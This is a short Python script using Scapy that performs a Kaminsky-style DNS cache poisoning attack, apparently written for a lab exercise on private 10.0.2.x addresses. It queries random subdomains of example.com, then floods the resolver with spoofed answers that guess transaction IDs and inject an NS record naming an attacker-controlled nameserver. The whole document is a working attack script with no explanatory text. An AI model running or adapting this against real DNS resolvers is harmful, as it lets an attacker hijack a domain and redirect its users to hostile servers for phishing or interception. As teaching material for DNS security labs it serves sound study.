from scapy.all import *
import random

fakeURL = []
spoofedIP = '10.0.2.4'
destIP = '10.0.2.5'
destPort = 33333
authority = '.example.com'
choices = 'abcdefghijklmnopqrstuvwxyz0123456789'

#build the array to try
for i in range(10000):
	fakeURL.append(''.join(random.choice(choices) for _ in range(5)) + authority)


for i in range(0,len(fakeURL)):
	url = fakeURL[i]
	query = IP(dst=destIP)/UDP(dport=53)/DNS(rd =1, qd=DNSQR(qname=url))
	send(query,verbose=0)
	for i in range(100):
		trans_id = random.randint(0x0000,0xffff)
		pkt = IP(dst=destIP,src=spoofedIP)/UDP(dport=destPort)/DNS(id = trans_id,qr=1L,aa=1L,qd=DNSQR(qname=url,qtype='A',qclass='IN'),an=DNSRR(rrname=url,type='A',rclass='IN',ttl=84000,rdata='10.0.2.15'),ns=DNSRR(rrname='example.com',type='NS',rclass='IN',ttl=84000,rdata='ns.dnslabattacker.net'), ar=DNSRR(rrname='ns.dnslabattacker.net',type='A',rclass='IN',ttl=84000,rdata='10.0.2.15'))
		send(pkt,verbose=0)
